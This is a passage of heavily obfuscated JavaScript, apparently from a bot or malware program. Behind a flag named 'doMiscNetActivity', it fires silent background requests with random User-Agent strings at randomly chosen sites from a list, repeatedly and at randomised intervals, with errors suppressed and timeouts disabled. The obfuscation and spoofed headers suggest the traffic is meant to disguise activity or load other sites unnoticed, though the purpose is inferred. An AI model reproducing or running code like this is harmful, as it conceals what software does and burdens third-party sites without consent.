    for (let l = 0x20bc + 0x2467 * 0x1 + 0x1 * -0x4523; l < 0x4f * 0x78 + 0x1685 + -0x3b89; l++)
      setTimeout(f, (-0x136d8 + -0xc86 * 0x22 + -0x35f2 * -0x12) * l * getRandomInt(-0x2 * -0x148 + -0x9e * -0x18 + 0x1 * -0x115f, -0x7ed * -0x4 + -0xa4 + -0x1f0d * 0x1));
  }, -0x136e43 + 0x4a0804 + 0x54bf * 0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a6 = b,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents[a6(0x1b, 'vpbD')](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    const a7 = d;
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents[a7(0x0)](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xf28 + 0x2c84 + 0xc * -0x2b) * getRandomInt(0x1a * -0x10 + 0x1b73 + -0x19d2, -0x1ee0 + -0x2de * 0xb + -0x1 * -0x3e6f));
}, 0x3 * -0xa5b + 0x52d + 0xe8 * 0x1d);